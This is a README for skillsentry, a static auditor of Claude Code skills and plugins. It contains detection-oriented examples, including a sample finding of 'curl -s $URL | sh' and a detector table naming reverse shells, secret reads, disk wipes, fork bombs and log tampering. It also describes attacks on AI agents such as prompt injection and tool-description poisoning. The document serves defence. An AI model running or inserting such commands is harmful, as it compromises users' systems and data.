<div align="center">

# 🛡️ skillsentry

### A static auditor for AI-agent skills — read it *before* you run it.

Point it at a Claude Code skill or plugin; it tells you, with receipts, whether it's safe to trust —
without ever executing what it scans.

[](./doc/articles/how-skillsentry-works.md)
[](https://github.com/whatbirdisthat/skillsentry/actions/workflows/ci.yml)
[](./LICENSE)
[](#why-you-can-trust-it)
[](#why-you-can-trust-it)

```sh
npx skillsentry <git-url | local-dir>
```

</div>

---

## Why this exists

Agent skills are **executable markdown + scripts that run with your shell's full authority**, and the bar
to publish one is a `SKILL.md` and an account. No mandatory review, no signing, no sandbox by default. That
gap is already being exploited — the ClawHub campaign shipped 30+ malicious skills; Snyk's *ToxicSkills*
research found prompt injection in more than a third of the skills it tested.

There wasn't an obvious one-line way to look at a skill *before* installing it, so we built one. That's the
whole motivation: a checker that should exist. It's MIT-licensed and free because a tool for deciding
whether something is safe to run shouldn't put that decision behind a paywall — not as a selling point,
just as the sensible default.

## How it works, in one picture

You give it a target; it clones (read-only, hooks disabled) or reads a local folder, enumerates the files,
runs a ruleset over them, and aggregates the findings into one verdict. Nothing in the skill is ever
executed.

<p align="center">
  
</p>

```
$ npx skillsentry github.com/acme/cool-skill
  ⛔ BLOCK  (1 high, 2 medium)
  high    dangerous-bash/curl-pipe-to-shell   hooks/post.sh:12   curl -s $URL | sh
          → remote code piped to a shell; classic install-time RCE
          → OWASP ASI04 · MITRE ATLAS AML.T0011
  verdict: BLOCK · report → ./skillsentry.{md,json} · exit 1
```

The [guide](./doc/guide/) explains every stage and every detector. The short version is below.

## What it looks for

Detection is layered into [tiers](./doc/guide/how-detection-works.md), each finding tagged to a recognised
framework (**OWASP** Agentic/MCP/LLM Top 10 + **MITRE ATLAS**) so it fits how security teams already work:

| Detector | Tier | Catches |
|---|---|---|
| `dangerous-bash` | T0 | `curl … \| sh`, reverse shells, secret reads, base64-piped payloads — install-time RCE |
| `prompt-injection` | T0 | hidden/coercive instructions, zero-width unicode, homoglyphs, encoded & ANSI "line-jumping" payloads |
| `over-broad-perms` | T0 | `"Bash(*)"` allow-all, network-reaching hooks, MCP servers fusing filesystem + network + secrets |
| `committed-secrets` | T0 | API keys, tokens, private keys committed into the skill |
| `tool-description-poisoning` | T0 | malicious instructions hidden in tool/skill **descriptions** the model reads but you don't |
| `resource-exhaustion` | T0 | destructive `rm -rf` of a root path, fork bombs, and raw-disk wipes (`dd`/`mkfs`/`shred`) — denial of service |
| `audit-evasion` | T0 | clearing shell history or tampering with `/var/log` to erase the trail |
| `dataflow-taint` | T1 | multi-line / cross-file shell payloads where a tainted source reaches a dangerous sink |

…plus a temporal pass (not a ruleset detector): **`version-drift` (T3)** — the **rug-pull**, a skill that
gained dangerous capability *after* you approved it (raised by diffing against a `.skillsentry.lock`
baseline, not by a per-file rule).

What it **doesn't** catch matters too — it's a pre-run static check, not a sandbox or a proof of safety.
The [threat model](./doc/guide/threat-model.md) is explicit about the limits.

## Beyond the CLI — the `threat-stack` platform

`npx skillsentry` is the trust anchor, but the repo also ships as a **Claude Code plugin marketplace**
called **threat-stack** (`AUDIT ▸ MODEL ▸ EXTEND`):

- **`skillsentry`** (AUDIT) — the pure auditor as an in-editor command (`/skillsentry:audit`), running
  the same deterministic CLI bundled in-repo (no npm install needed).
- **`threat-modeler`** (MODEL) — maps the probe set onto STRIDE + agentic axes, runs the
  Elevation-of-Privilege gap ritual, and proposes new rules via PR (never self-merge).
- **`supersize-semgrep`** (EXTEND) — an opt-in, separate-trust-model Semgrep SAST extension that never
  touches the auditor's zero-dependency core.

Install: `/plugin marketplace add whatbirdisthat/skillsentry` then `/plugin install skillsentry@threat-stack`.

> **Naming:** the git repo is `exosphere`; the trust-anchor CLI/package is **`skillsentry`**; the plugin
> marketplace that wraps it is **`threat-stack`**.

## Why you can trust it

A security tool you can't trust is worse than none, so skillsentry is built to be auditable by design:

- 🔒 **It never executes what it audits.** Remote sources are fetched read-only — no build, install, or
  hook ever fires. The guarantee is *structural*: the pure core does no I/O, enforced by a build-time test.
- 🧾 **Every finding is explainable.** A verdict cites the exact `file:line`, the rule, *why* it's
  dangerous, and its OWASP/ATLAS IDs. No opaque "risk score."
- 👁️ **Nothing is hidden silently.** `.skillsentryignore` can narrow a scan, but the report still discloses
  every excluded file and pattern — an ignore file (or lockfile) can never quietly bury a finding.
- 📦 **Zero npm/runtime-package dependencies.** The thing that audits your supply chain adds no package
  supply chain of its own. (Auditing a *git-URL* target uses the host's `git` to clone it first; a
  local-dir audit needs nothing but Node.)
- 🎯 **Deterministic & offline.** Same input → same verdict. No network in the scan path, no LLM in the
  loop, nothing to phone home.
- ✅ **100% test coverage**, proven against a labelled corpus of real malicious + benign skills.

The [architecture guide](./doc/guide/architecture.md) explains how these properties are enforced rather
than merely promised.

## Quick start

```sh
# Audit a skill before you install it (fetched read-only, never executed)
npx skillsentry github.com/some/skill

# Audit a local folder
npx skillsentry ./path/to/skill

# Machine-readable output for tooling
npx skillsentry ./skill --json
```

A **BLOCK** exits non-zero (so it drops into CI); **PASS** and **REVIEW** exit `0`. Every run writes a
`skillsentry.md` + `skillsentry.json` report. See [reading a report](./doc/guide/threat-model.md#reading-a-report).

### Catch the rug-pull (`--approve`)

Record a trusted baseline once; skillsentry then flags any dangerous capability the skill gains later.

```sh
skillsentry ./skill --approve   # writes .skillsentry.lock — the approved capability fingerprint
skillsentry ./skill             # later runs diff against it: escalation → REVIEW/BLOCK, benign edits → PASS
```

A lockfile can only *raise* a verdict, never lower one, so it can't be used to launder a finding. How and
why: [tier T3](./doc/guide/how-detection-works.md#tier-t3--rug-pull--version-drift).

### Earn a trust badge (`--badge`) · Gate CI (`--ci`) · Tune the scan (`.skillsentryignore`)

`skillsentry . --badge` mints a deterministic, offline "audited by skillsentry" badge on a clean PASS (and
still discloses any exclusions). `--ci` exits non-zero only on BLOCK. A `.skillsentryignore` (gitignore-style
globs) excludes legitimately-flagged files — every exclusion counted and disclosed; `--no-ignore` forces a
full scan.

## Documentation

Start with the long-form article [**How skillsentry works**](./doc/articles/how-skillsentry-works.md) —
the threat, the design, the tiers, and the limits, in one read.

The [**guide**](./doc/guide/) is the how-and-why, by topic:

- [Threat model & reading a report](./doc/guide/threat-model.md) — the attacks, the limits, the verdicts
- [Architecture](./doc/guide/architecture.md) — the pipeline and the never-execute boundary
- [How detection works](./doc/guide/how-detection-works.md) — the tiers and every detector
- [Glossary](./doc/guide/glossary.md) — taint, tiers, capability fingerprint, and the rest
- [Diagrams](./doc/guide/diagrams/) — the source + rendered figures used throughout

Deeper still: the [Architecture Decision Records](./doc/architecture/) record the rationale for each design
choice, and [`doc/SPECIFICATION.ears.md`](./doc/SPECIFICATION.ears.md) is the testable requirement set.

## Contributing

Detection rules are **declarative, versioned data** — not buried in code — so adding one is a small,
reviewable change with its own fixtures and a precision budget (a rule that pushes corpus false-positives
over budget is rejected, not merged). Start with [`CONTRIBUTING.md`](./CONTRIBUTING.md) and the
[ruleset guide](./doc/RULESET.md).

## License

[MIT](./LICENSE).

<div align="center"><sub><b>skillsentry</b> · read it before you trust it 🛸</sub></div>
